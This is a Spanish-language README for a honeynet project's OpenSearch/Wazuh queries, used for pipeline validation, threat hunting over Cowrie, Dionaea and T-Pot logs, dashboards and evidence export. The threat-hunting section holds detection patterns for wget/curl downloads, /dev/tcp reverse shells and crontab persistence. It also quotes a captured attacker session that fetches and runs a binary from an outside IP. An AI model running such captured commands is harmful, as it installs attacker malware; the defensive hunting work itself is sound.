# queries/ — Consultas OpenSearch / Wazuh Dashboard

Este directorio reúne las queries de búsqueda, filtros y visualizaciones
utilizadas durante el proyecto para análisis, threat hunting y validación
del pipeline de detección. Todas son compatibles con el index pattern
`wazuh-archives-*` y `wazuh-alerts-*` del Dashboard.

---

## Estructura
```text
queries/  
├── README.md Este archivo  
└── json/ Queries exportadas desde OpenSearch  
├── query-01-conteo-honeypot.json  
├── query-02-top20-ips.json  
├── query-03-top-15-paises.json  
├── query-04-MITRE-por-honeypot.json  
├── query-05-credenciales-cowrie.json  
├── query-06-timeline-por-dia.json  
├── query-07-alertas-ti.json  
├── query-08-comandos-cowrie.json  
└── query-09-protocolos-dionaea.json
```
>Cada archivo JSON corresponde a una visualización concreta del Wazuh Dashboard
(OpenSearch). Se pueden importar directamente en DevTools o usar como referencia
para construir paneles y dashboards personalizados.

---

## Index Patterns

| Pattern | Contenido | Cuándo usarlo |
|:--------|:----------|:--------------|
| `wazuh-alerts-*` | Solo eventos que dispararon una regla activa | Revisar alertas, TI matches, brute-force |
| `wazuh-archives-*` | Todos los eventos de todos los sensores | Hunting, análisis de volumen, validación |

> Para análisis de honeypots usar **siempre `wazuh-archives-*`**:
> la mayoría de eventos base (conexiones, logins fallidos) tienen
> `no_log` y no generan alerta, pero sí llegan al archive.

---

## Validación del Pipeline

### 01 — Tres sensores activos enviando eventos

**Index:** `wazuh-archives-*`  
**Time range:** Last 15 minutes (ajustar según necesidad)

# Cowrie

data.@source: "cowrie"

# T-Pot

data.@source: "tpot"

# Dionaea

data.@source: "dionaea"


Verificación rápida: los tres filtros deben retornar hits en los
últimos 15 minutos cuando el entorno está operativo.

**Campos útiles para agregar en la tabla:**

timestamp | agent.name | data.@source | data.eventid

---

### 02 — Verificar agentes conectados

**Index:** `wazuh-alerts-*`  
**Filtro:** Buscar el último heartbeat de cada agente

agent.name: "ip-10-0-10-36" # Cowrie  
agent.name: "ip-10-0-10-76" # T-Pot  
agent.name: "ip-10-0-10-154" # Dionaea

Alternativa desde el Manager (terminal):

```bash
sudo /var/ossec/bin/agent_control -l | grep -E "Active|Disconnected"
```

---

## 03 — Archives habilitados y recibiendo datos

**Index:** `wazuh-archives-*`  
**Verificar que existen documentos en las últimas 24h:**

```text
* (sin filtro adicional)
```

Si el count es 0, revisar:

```bash
# En el Manager
grep "logall_json" /var/ossec/etc/ossec.conf
# → <logall_json>yes</logall_json>

grep "archives.enabled" /etc/filebeat/modules.d/wazuh.yml
# → archives.enabled: true
```

---

## Threat Hunting

## 01 — Top IPs atacantes por sensor

**Index:** `wazuh-archives-*`  
**Objetivo:** Identificar las IPs más activas de los últimos 7 días

**Cowrie — por src_ip:**

```text
data.@source: "cowrie" AND data.eventid: "cowrie.login.failed"
```

Agregar visualización de términos sobre el campo `data.src_ip`  
ordenado por count descendente.

**Dionaea — por protocolo:**

```text
data.@source: "dionaea"
```

Tabla de términos sobre `data.connection.protocol` + `data.connection.remote_host`.

**T-Pot — por client_ip:**

```text
data.@source: "tpot"
```

Tabla de términos sobre `data.client_ip`.

**Resultado del proyecto (Top 5 global):**

|IP|Sensor|Eventos|Clasificación TI|
|---|---|---|---|
|`201.187.98.150`|Dionaea|64,095|Hospital Base Valdivia|
|`3.130.168.2`|Multi|~312|scan.visionheight.com — score 100|
|`158.51.96.38`|Cowrie|~847|NetInformatik — score 100 / 924 reports|
|`3.129.187.38`|Multi|—|scan.visionheight.com — score 100|
|`18.218.118.203`|Multi|—|scan.visionheight.com — score 100|

---

## 02 — Credenciales más intentadas en Cowrie

**Index:** `wazuh-archives-*`

```text
data.@source: "cowrie" AND data.eventid: "cowrie.login.failed"
```

**Campos para agregar:**

```text
data.username | data.password | data.src_ip
```

Tabla de términos sobre `data.username` y tabla separada sobre  
`data.password`, ambas ordenadas por count.

**Hallazgos del proyecto:**

|Username|Count|Categoría|
|---|---|---|
|`root`|Mayor|Default credential|
|`admin`|Alto|Default credential|
|`ubuntu`|Medio|Cloud instance default|
|`user`|Medio|Generic|
|`pi`|Bajo|IoT / Raspberry Pi|

---
## 03 — Comandos críticos en sesiones Cowrie

**Index:** `wazuh-archives-*`

**Todos los comandos ejecutados:**

```text
data.@source: "cowrie" AND data.eventid: "cowrie.command.input"
```

**Alta fidelidad — download + execute:**

```text
data.@source: "cowrie" AND data.eventid: "cowrie.command.input"
AND data.input: *wget* OR data.input: *curl*
```

**Reverse shell:**

```text
data.@source: "cowrie" AND data.eventid: "cowrie.command.input"
AND data.input: */dev/tcp/*
```

**Persistencia:**

```text
data.@source: "cowrie" AND data.eventid: "cowrie.command.input"
AND (data.input: *crontab* OR data.input: *chmod +x*)
```

**Campos para agregar:**

```text
timestamp | data.src_ip | data.input | data.session
```

**Hallazgo crítico del proyecto — `158.51.96.38`:**

Secuencia de comandos capturados en una sesión:

```bash
# Descarga y ejecución de binario malicioso
wget http://212.192.246.9/sshd -O /tmp/.x/sshd
chmod +x /tmp/.x/sshd

# Escaneo de red hacia 50+ IPs
/tmp/.x/sshd 185.216.x.x
/tmp/.x/sshd 203.0.x.x
...
```

---

## 04 — Alertas de Threat Intelligence

**Index:** `wazuh-alerts-*`  
**Objetivo:** Ver todas las alertas generadas por match en CDB TI

```text
rule.id: 100578 OR rule.id: 100579 OR rule.id: 100580
```

O usando el grupo:

```text
rule.groups: "honeynet_ti"
```

**Campos para agregar:**

```text
timestamp | agent.name | data.src_ip | data.client_ip | rule.description | rule.mitre.id
```

**Filtrar solo high-confidence (nivel ≥ 10):**

```text
rule.groups: "honeynet_ti" AND rule.level: [10 TO *]
```

**Resultado del proyecto:**

```text
Total alertas TI: 85
IPs con score 100/100: 3 (scan.visionheight.com)
```

---
## 05 — Análisis del hallazgo SMB masivo

**Index:** `wazuh-archives-*`  
**Objetivo:** Analizar el spike de 64,095 eventos SMB del 2026-03-03

**Filtro base:**

```text
data.@source: "dionaea" AND data.connection.protocol: "smbd"
```

**Filtrar por IP del hallazgo:**

```text
data.@source: "dionaea" AND data.connection.remote_host: "201.187.98.150"
```

**Timeline del spike (usar visualización de línea de tiempo):**

- X-axis: `timestamp` agrupado por hora
    
- Y-axis: count de eventos
    
- Filtro: `data.connection.remote_host: "201.187.98.150"`
    

Verificar que el spike ocurre el **2026-03-03** y decrece al día siguiente,  
consistente con un host comprometido con tráfico de propagación.

**Campos para exportar como evidencia:**

```text
timestamp | data.connection.remote_host | data.connection.protocol
data.connection.local_port | agent.name
```

## Dashboards — Paneles Recomendados

## Panel 01 — Vista general HoneyNet
| Panel                 | Tipo       | Métrica              | Index              |
| --------------------- | ---------- | -------------------- | ------------------ |
| Total eventos         | Metric     | count                | `wazuh-archives-*` |
| Eventos por sensor    | Donut      | terms `data.@source` | `wazuh-archives-*` |
| Timeline de actividad | Line       | count por hora       | `wazuh-archives-*` |
| Top IPs atacantes     | Data table | terms `data.src_ip`  | `wazuh-archives-*` |
| Mapa de origen        | Map        | geo `data.src_ip`    | `wazuh-archives-*` |
## Panel 02 — Alertas activas
|Panel|Tipo|Métrica|Index|
|---|---|---|---|
|Alertas nivel ≥ 10|Metric|count|`wazuh-alerts-*`|
|Alertas TI|Metric|rule.groups: honeynet_ti|`wazuh-alerts-*`|
|Distribución por nivel|Bar|terms `rule.level`|`wazuh-alerts-*`|
|MITRE cobertura|Data table|terms `rule.mitre.id`|`wazuh-alerts-*`|
## Panel 03 — Cowrie detalle
| Panel                   | Tipo       | Métrica               |
| ----------------------- | ---------- | --------------------- |
| Login failed vs success | Donut      | terms `data.eventid`  |
| Top usernames           | Data table | terms `data.username` |
| Top passwords           | Data table | terms `data.password` |
| Comandos ejecutados     | Tag cloud  | terms `data.input`    |

---

## Exportar Eventos como Evidencia

Desde Discover con el filtro aplicado:
```text
1. Aplicar filtro de tiempo y query
2. Share → CSV Reports → Generate CSV
3. Descargar desde Management → Reporting
```

O desde el terminal del Manager:
```bash
# Exportar alertas TI a JSON
curl -sk -u admin:<PASSWORD> \
  -X POST "https://localhost:9200/wazuh-alerts-*/_search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {
      "terms": { "rule.id": ["100578","100579","100580"] }
    },
    "size": 1000
  }' | python3 -m json.tool > exports/ti_alerts_export.json
```


## Mapa de queries → uso esperado

| Archivo JSON                         | Propósito principal                         | Tipo de visualización típica         |
|--------------------------------------|---------------------------------------------|--------------------------------------|
| json/query-01-conteo-honeypot.json   | Conteo total de eventos por honeypot        | Metric + bar (por `data.@source`)    |
| json/query-02-top20-ips.json         | Top 20 IPs atacantes por volumen            | Data table / bar (terms `src_ip`)    |
| json/query-03-top-15-paises.json     | Top 15 países de origen                     | Pie / bar (geo.country / `src_ip`)   |
| json/query-04-MITRE-por-honeypot.json| Cobertura MITRE por sensor                  | Bar apilada (`rule.mitre.id`)        |
| json/query-05-credenciales-cowrie.json| Usuarios/contraseñas más intentados en Cowrie | Data table (username/password)   |
| json/query-06-timeline-por-dia.json  | Timeline de eventos por día                 | Line/area (date histogram)           |
| json/query-07-alertas-ti.json        | Alertas de Threat Intelligence              | Data table (rule.id 100578/9/80)     |
| json/query-08-comandos-cowrie.json   | Comandos ejecutados en sesiones Cowrie      | Tag cloud / table (`data.input`)     |
| json/query-09-protocolos-dionaea.json| Volumen por protocolo en Dionaea            | Bar (terms `data.connection.protocol`)|

Cada JSON puede cargarse en DevTools o usarse como plantilla para crear
visualizaciones equivalentes en el Wazuh Dashboard.

## Evidencias gráficas — DevTools

Las screenshots de cada query ejecutada en OpenSearch DevTools
viven en `screenshots/queries/`. Sirven como evidencia del resultado
real obtenido durante la operación del proyecto.

| Query JSON                            | Screenshot DevTools                                        |
|---------------------------------------|------------------------------------------------------------|
| json/query-01-conteo-honeypot.json    | screenshots/queries/devtools-query01-conteo-honeypot.png   |
| json/query-02-top20-ips.json          | screenshots/queries/devtools-query02-top20-ips.png         |
| json/query-03-top-15-paises.json      | screenshots/queries/devtools-query03-top-15-paises.png     |
| json/query-04-MITRE-por-honeypot.json | screenshots/queries/devtools-query04-MITRE-por-honeypot.png|
| json/query-05-credenciales-cowrie.json| screenshots/queries/devtools-query05-credenciales-cowrie.png|
| json/query-06-timeline-por-dia.json   | screenshots/queries/devtools-query06-timeline-por-dia.png  |
| json/query-07-alertas-ti.json         | screenshots/queries/devtools-query07-alertas-ti.png        |
| json/query-08-comandos-cowrie.json    | screenshots/queries/devtools-query08-comandos-cowrie.png   |
| json/query-09-protocolos-dionaea.json | screenshots/queries/devtools-query09-protocolos-dionaea.png|

## Referencias

- [Informe Final — Análisis de Hallazgos](cloud-honeynet-aws/docs/03-analisis/hallazgos)
    
- [Reglas de Detección](cloud-honeynet-aws/docs/02-wazuh-integracion/reglas-custom)
    
- [Wazuh Dashboard — Discover](https://documentation.wazuh.com/current/user-manual/wazuh-dashboard/queries.html)
    
- [OpenSearch — Query DSL](https://opensearch.org/docs/latest/query-dsl/)
